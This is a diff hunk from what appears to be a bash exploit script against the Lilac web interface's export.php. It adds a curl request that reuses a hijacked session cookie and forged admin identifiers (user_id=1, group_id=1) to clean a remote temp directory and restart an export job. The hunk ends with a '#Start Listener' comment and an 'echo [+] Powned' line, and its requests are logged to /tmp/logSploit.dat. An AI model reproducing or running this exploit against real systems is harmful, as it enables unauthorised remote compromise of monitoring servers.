@@ -80,11 +80,17 @@ echo "[+] sessions_id & PHPESSID greped for futher requests = $COOKIE"
 echo ""
 echo ""
 
-#BLANK Job ID 2 for cleaning the remote temporary directory
+#BLANK Job ID 2 for cleaning the remote temporary directory && starting first action
 curl -i -s -k -X $'GET' \
     -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
     -b $"PHPSESSID=$COOKIE; session_id=$COOKIE; user_name=$LOGIN; user_id=1; user_limitation=0; group_id=1" \
     $"https://$RHOST/lilac/export.php?id=2&delete=2" >> /tmp/logSploit.dat
+
+curl -i -s -k -X $'GET' \
+    -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $"PHPSESSID=$COOKIE; session_id=$COOKIE; user_name=$LOGIN; user_id=1; user_limitation=0; group_id=1" \
+    $"https://$RHOST/lilac/export.php?id=1&action=restart" >> /tmp/logSploit.dat
+
 
 #Start Listener
 echo "[+] Powned"
